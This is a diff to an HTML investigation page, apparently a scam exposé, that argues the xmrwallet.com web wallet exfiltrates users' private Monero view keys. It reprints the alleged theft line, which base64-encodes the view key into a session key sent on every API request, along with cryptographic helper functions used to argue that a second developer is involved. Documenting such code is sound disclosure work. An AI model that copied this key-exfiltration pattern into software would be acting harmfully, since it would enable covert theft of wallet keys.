@@ -580,16 +580,90 @@ target_y = <span class="func">sum</span>(p[<span class="number">1</span>] <span 
     }
 }</code></pre>
 
-        <p>Compare the clean, commented style above with the theft code on the <strong>same page</strong> &mdash; the line that steals your view key, written by the original operator years ago:</p>
+        <p>The new developer also rewrote the <code>signMessage()</code> function with numbered steps and detailed comments &mdash; something the original operator never did:</p>
 
-        <pre><code><span class="comment">// Line 628 of login page — the theft itself, original code style:</span>
+        <pre><code><span class="keyword">function</span> <span class="func">signMessage</span>(message, privateSpendKey) {
+    <span class="keyword">try</span> {
+        <span class="keyword">if</span> (!privateSpendKey || !/^[0-9a-fA-F]{64}$/.<span class="func">test</span>(privateSpendKey)) {
+            <span class="keyword">return null</span>;
+        }
+
+        <span class="comment">// FIX: Convert message to hex of bytes before hashing</span>
+        <span class="keyword">const</span> messageHex = <span class="func">stringToHex</span>(message);
+        <span class="keyword">const</span> messageHash = cnUtil.<span class="func">cn_fast_hash</span>(messageHex);
+
+        <span class="keyword">const</span> publicSpendKey = cnUtil.<span class="func">sec_key_to_pub</span>(privateSpendKey);
+
+        <span class="comment">// 3. Generate nonce `r` and compute the point `R = r * G`</span>
+        <span class="keyword">const</span> r = cnUtil.<span class="func">random_scalar</span>();
+        <span class="keyword">const</span> R_encoded_hex = cnUtil.<span class="func">ge_scalarmult_base</span>(r);
+
+        <span class="comment">// 4. Create challenge `e = H(R || P || M)`</span>
+        <span class="keyword">const</span> challengeData = R_encoded_hex + publicSpendKey + messageHash;
+        <span class="keyword">let</span> e = cnUtil.<span class="func">cn_fast_hash</span>(challengeData);
+        e = cnUtil.<span class="func">sc_reduce32</span>(e); <span class="comment">// Reduce to a valid scalar</span>
+
+        <span class="comment">// 5. Compute `s = r + e * a` (where a is the private spend key)</span>
+        <span class="keyword">const</span> eTimesPrivate = cnUtil.<span class="func">sc_mul</span>(e, privateSpendKey);
+        <span class="keyword">const</span> s = cnUtil.<span class="func">sc_add</span>(r, eTimesPrivate);
+
+        <span class="comment">// The final signature is `(R, s)` concatenated</span>
+        <span class="keyword">const</span> signature = R_encoded_hex + s;
+
+        <span class="comment">// This is often what is returned for verification purposes</span>
+        <span class="keyword">const</span> verification = publicSpendKey + signature;
+        <span class="keyword">return</span> verification;
+    } <span class="keyword">catch</span> (error) {
+        <span class="keyword">return null</span>;
+    }
+}</code></pre>
+
+        <p>The subaddress generator follows the same clean, documented pattern &mdash; inline hex constants, numbered steps, parameter validation:</p>
+
+        <pre><code><span class="keyword">function</span> <span class="func">get_subaddress</span>(publicSpendHex, privateViewHex, majorIndex, minorIndex) {
+    <span class="comment">// Validate input parameters</span>
+    <span class="keyword">if</span> (!publicSpendHex || publicSpendHex.length !== <span class="number">64</span>) {
+        <span class="keyword">throw new</span> Error(<span class="string">"Invalid public spend key: must be a 64-character hex string"</span>);
+    }
+
+    <span class="comment">// Step 1: Compute the subaddress secret key scalar</span>
+    <span class="comment">// "SubAddr\0" prefix in hex (null-terminated string "SubAddr")</span>
+    <span class="keyword">const</span> subAddrPrefix = <span class="string">"5375624164647200"</span>; <span class="comment">// Hex for "SubAddr\0"</span>
+    <span class="comment">// Convert indices to 4-byte little-endian hex</span>
+    <span class="keyword">const</span> majorIndexHex = <span class="func">toLittleEndianHex</span>(majorIndex);
+    <span class="keyword">const</span> minorIndexHex = <span class="func">toLittleEndianHex</span>(minorIndex);
+    <span class="comment">// Concatenate data for hashing</span>
+    <span class="keyword">const</span> data = subAddrPrefix + privateViewHex + majorIndexHex + minorIndexHex;
+
+    <span class="comment">// Hash the concatenated data to get a scalar</span>
+    <span class="keyword">let</span> m = cnUtil.<span class="func">cn_fast_hash</span>(data);
+    m = cnUtil.<span class="func">sc_reduce32</span>(m); <span class="comment">// Reduce to a valid scalar in the Ed25519 field</span>
+
+    <span class="comment">// Step 2: Compute the subaddress public spend key</span>
+    <span class="keyword">const</span> mG = cnUtil.<span class="func">ge_scalarmult_base</span>(m);
+    <span class="keyword">const</span> subaddressPublicSpend = cnUtil.<span class="func">ge_add</span>(publicSpendHex, mG);
+
+    <span class="comment">// Step 3: Use the main wallet's public view key</span>
+    <span class="keyword">const</span> subaddressPublicView = keys.view.pub;
+
+    <span class="keyword">return</span> { spend: { pub: subaddressPublicSpend }, view: { pub: subaddressPublicView } };
+}</code></pre>
+
+        <p>And then, just a few lines below all these clean, commented functions, sits the actual theft &mdash; the line that steals your private view key:</p>
+
+        <pre><code><span class="comment">// The theft — no comments, no explanation, crammed into a single line:</span>
+session_id = returned_data[<span class="number">1</span>];
 session_key = returned_data[<span class="number">2</span>] + <span class="string">":"</span> + <span class="func">btoa</span>(xmrwallet_address)
-    + <span class="string">":"</span> + <span class="func">btoa</span>(xmrwallet_viewkey);  <span class="comment">// ← YOUR PRIVATE VIEW KEY, base64-encoded, sent to the scammer's server on every subsequent request</span></code></pre>
+    + <span class="string">":"</span> + <span class="func">btoa</span>(xmrwallet_viewkey);
+<span class="comment">// ↑ YOUR PRIVATE VIEW KEY encoded in base64,</span>
+<span class="comment">//   sent to the scammer's server with EVERY API request that follows.</span>
+<span class="comment">//   40+ times per session. To auth.php, getheightsync.php,</span>
+<span class="comment">//   gettransactions.php, getbalance.php, getoutputs.php...</span></code></pre>
 
-        <p>This <code>session_key</code> is then transmitted on <strong>40+ API requests per session</strong> &mdash; to <code>auth.php</code>, <code>getheightsync.php</code>, <code>gettransactions.php</code>, <code>getbalance.php</code>, <code>getsubaddresses.php</code>, <code>getoutputs.php</code>, and the backdoor <code>support_login.html</code>. The captcha "protects" the login flow, but the theft mechanism behind it remains identical.</p>
+        <p>This <code>session_key</code> is transmitted on <strong>40+ API requests per session</strong>. The captcha "protects" the login flow, but the theft mechanism behind it remains identical. Every user who passes the captcha gets their view key exfiltrated on the very next line.</p>
 
         <div class="orange-box">
-            <strong>Two hands, one scam:</strong> The captcha code has numbered step comments (<code>// 1. Show Container</code>, <code>// 2. Data arrived</code>), explanatory notes about JavaScript precision (<code>// Because JavaScript numbers are double precision floats</code>), and async/await patterns. The original theft code uses jQuery <code>$.ajax</code>, inline <code>btoa()</code> key exfiltration, and zero comments. These are two different developers working on the same criminal application. The old operator brought in someone young.
+            <strong>Two developers, one scam:</strong> The evidence is in the code itself. Properly structured functions with <code>// FIX:</code> comments, numbered steps (<code>// 3. Generate nonce</code>, <code>// 4. Create challenge</code>, <code>// 5. Compute s</code>), parameter validation, and explanatory hex constants (<code>"5375624164647200" // Hex for "SubAddr\0"</code>). Then immediately below: bare <code>btoa(xmrwallet_viewkey)</code> crammed into a session cookie with no explanation. The new developer writes clean, educational-style code. The old operator wrote the theft. They are not the same person. Someone was hired to defend a decade-old Monero theft operation.
         </div>
 
         <!-- ═══════════════════════════════════════════ -->
@@ -687,14 +761,9 @@ session_key = returned_data[<span class="number">2</span>] + <span class="string
         </ul>
 
         <div class="mirrors">
-            <h3>All Investigation Mirrors</h3>
+            <h3>Full Investigation</h3>
             <ul>
-                <li><a href="https://phishdestroy.github.io/DO-NOT-USE-xmrwallet-com/">phishdestroy.github.io/DO-NOT-USE-xmrwallet-com</a></li>
-                <li><a href="https://phishdestroy.codeberg.page/DO-NOT-USE-xmrwallet-com/">phishdestroy.codeberg.page/DO-NOT-USE-xmrwallet-com</a></li>
-                <li><a href="https://phishdestroy.gitlab.io/do-not-use-xmrwallet-com/">phishdestroy.gitlab.io/do-not-use-xmrwallet-com</a></li>
-                <li><a href="https://phishdestroy.bitbucket.io/DO-NOT-USE-xmrwallet-com/">phishdestroy.bitbucket.io/DO-NOT-USE-xmrwallet-com</a></li>
-                <li><a href="https://phishdestroy-research.on.drv.tw/DO-NOT-USE-xmrwallet-com/">phishdestroy-research.on.drv.tw/DO-NOT-USE-xmrwallet-com</a></li>
-                <li><a href="https://phishdestroy.neocities.org/DO-NOT-USE-xmrwallet-com/">phishdestroy.neocities.org/DO-NOT-USE-xmrwallet-com</a></li>
+                <li><a href="../index.html">PhishDestroy Research &mdash; Complete Technical Evidence</a></li>
             </ul>
         </div>
     </article>
